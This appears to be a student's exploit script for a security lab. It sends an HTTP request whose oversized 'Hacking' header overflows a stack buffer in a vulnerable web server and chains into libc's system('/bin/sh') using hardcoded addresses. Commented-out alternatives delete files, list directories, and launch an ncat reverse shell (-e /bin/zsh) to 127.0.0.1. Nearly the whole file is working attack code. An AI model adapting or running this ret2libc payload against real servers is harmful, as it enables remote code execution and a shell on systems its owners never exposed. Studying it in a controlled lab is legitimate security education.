#!/usr/bin/python3
import sys
import socket
import traceback
import struct
import time
import os.path
import binascii
from pwn import *

# libc base address
# ASLR should be off, so that libc's base address will not change untill next reboot .
base_addr = 0xf7d93000

# All of the offsets of functions (strings) inside libc won't change much (sometimes changed, so check is needed).
# To get the offset of a funtion:
##  readelf -a /lib/i386-linux-gnu/libc.so.6 | grep "system"
# To get the offset of string "/bin/sh":
##  ropper --file /lib/i386-linux-gnu/libc.so.6 --string "/bin/sh"
sh_str_addr = base_addr + 0x0018fb62
system_addr = base_addr + 0x00044d00
exit_addr   = base_addr + 0x00037680
unlink_addr = base_addr + 0x000f3f60
remove_addr = base_addr + 0x00054d10
chdir_addr  = base_addr + 0x000f2ba0
chroot_addr = base_addr + 0x000fd810
puts_addr   = base_addr + 0x0006f4e0
execl_addr  = base_addr + 0x000ca470
rmdir_addr  = base_addr + 0x000f3fb0

# ebp too make the task simple, we print ebp of getToken function (vulnerable) 
ebp_addr = 0xffffd1f8

## Below is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the vulnerable web server and exploit it.

def build_exploit(shellcode):

    # All of the header information other than "Content-Length" is not important
    req  = ("POST / HTTP/1.1\r\n").encode('latin-1')
    req += ("Host: 127.0.0.1\r\n").encode('latin-1')
    # The Content-Length below is useful, and depends on the length of username + password, 
    ##  you need to use wireshark (together with web browser) for checking the length.
    req += ("Content-Length: 64\r\n").encode('latin-1')
    req += ("Origin: http://127.0.0.1\r\n").encode('latin-1')
    req += ("Connection: keep-alive\r\n").encode('latin-1')
    req += ("Referer: http://127.0.0.1/\r\n").encode('latin-1')

    # For different oses (and compilation), the length of fillup for 
    # hijacking the return address in the stack, could be different,
    # therefore you need to debug the program for checking and adjusting.
    req += ("Hacking: ").encode('latin-1')


    # unlink_arg = "/tmp/test.txt\0"
    # unlink_arg_addr = ebp_addr + 20
    # req += b'XBA' * 356
    # req += p32(remove_addr)
    # req += p32(exit_addr)
    # req += p32(unlink_arg_addr)
    # req += p32(0)
    # req += unlink_arg.encode('latin-1')


    system_arg = "/bin/sh\0\0"
    system_arg_addr = ebp_addr + 20
    req += b'XBA' * 356
    req += p32(system_addr)
    req += p32(exit_addr)
    req += p32(system_arg_addr)
    req += p32(0)
    req += system_arg.encode('latin-1')


    # shell_arg_0 = "/bin/ls\0\0\0\0\0"
    # shell_arg_1 = "ls\0\0\0\0\0"
    # shell_arg_2 = "-l\0\0\0\0\0\0\0\0\0\0"
    # shell_arg_3 = "./\0\0\0\0"
    # shell_arg_addr_0 = ebp_addr + 56
    # shell_arg_addr_1 = shell_arg_addr_0 + len(shell_arg_0.encode('latin-1'))
    # shell_arg_addr_2 = shell_arg_addr_1 + len(shell_arg_1.encode('latin-1'))
    # shell_arg_addr_3 = shell_arg_addr_2 + len(shell_arg_2.encode('latin-1'))
    # req += b'XBA' * 356
    # req += p32(execl_addr)
    # req += p32(exit_addr)
    # req += p32(shell_arg_addr_0)
    # req += p32(shell_arg_addr_1)
    # req += p32(shell_arg_addr_2)
    # req += p32(shell_arg_addr_3)
    # req += p32(0x00000000)
    # req += p32(0x00000000)
    # req += p32(0x00000000)
    # req += p32(0x00000000)
    # req += p32(0x00000000)
    # req += p32(0x00000000)
    # req += p32(0x00000000)
    # req += shell_arg_0.encode('latin-1')
    # req += shell_arg_1.encode('latin-1')
    # req += shell_arg_2.encode('latin-1')
    # req += shell_arg_3.encode('latin-1')


    # shell_arg_0 = "/bin/ncat\0\0\0"
    # shell_arg_1 = "ncat\0\0\0"
    # shell_arg_2 = "127.0.0.1\0\0\0"
    # shell_arg_3 = "11803\0\0\0"
    # shell_arg_4 = "-e\0\0"
    # shell_arg_5 = "/bin/zsh\0\0\0"
    # shell_arg_addr_0 = ebp_addr + 56
    # shell_arg_addr_1 = shell_arg_addr_0 + len(shell_arg_0.encode('latin-1'))
    # shell_arg_addr_2 = shell_arg_addr_1 + len(shell_arg_1.encode('latin-1'))
    # shell_arg_addr_3 = shell_arg_addr_2 + len(shell_arg_2.encode('latin-1'))
    # shell_arg_addr_4 = shell_arg_addr_3 + len(shell_arg_3.encode('latin-1'))
    # shell_arg_addr_5 = shell_arg_addr_4 + len(shell_arg_4.encode('latin-1'))
    # req += b'XBA' * 356
    # req += p32(execl_addr)
    # req += p32(exit_addr)
    # req += p32(shell_arg_addr_0)
    # req += p32(shell_arg_addr_1)
    # req += p32(shell_arg_addr_2)
    # req += p32(shell_arg_addr_3)
    # req += p32(shell_arg_addr_4)
    # req += p32(shell_arg_addr_5)
    # req += p32(0x00000000)
    # req += p32(0x00000000)
    # req += p32(0x00000000)
    # req += p32(0x00000000)
    # req += p32(0x00000000)
    # req += shell_arg_0.encode('latin-1')
    # req += shell_arg_1.encode('latin-1')
    # req += shell_arg_2.encode('latin-1')
    # req += shell_arg_3.encode('latin-1')
    # req += shell_arg_4.encode('latin-1')
    # req += shell_arg_5.encode('latin-1')


    # rmdir_arg = "/tmp/testdir\0"
    # rmdir_arg_addr = ebp_addr + 20
    # req += b'XBA' * 356
    # req += p32(rmdir_addr)
    # req += p32(exit_addr)
    # req += p32(rmdir_arg_addr)
    # req += p32(0)
    # req += rmdir_arg.encode('latin-1')


    # The end of header line "Hacking: xxxxx".
    req += ("\r\n").encode('latin-1')

    # The blank line between headers and body.
    req += ("\r\n").encode('latin-1')
   
    # Below is the username/password that you can Register into the web server
    # by using web browser. These information will be stored into the sqlite db behind.
    # You need to change these information according to your own registration.
 
    # Note that successful POST will be responded by the server with a hint page.
    # By using the successful response, you can judge whether the server has been 
    # crashed (by exploit), so that you can adjust the fillup accordingly.
    req += ("login_username=xubiang&login_password=xubiang&submit_login=Login").encode('latin-1')

    # print(req)
    return req


def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ("").encode("latin-1")
    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp


if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellcode = ""
    if(os.path.exists("shellcode.bin")):
        shellfile = open("shellcode.bin", "r")
        shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:", req)
    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:", resp)
except:
    print("Exception:", traceback.format_exc())
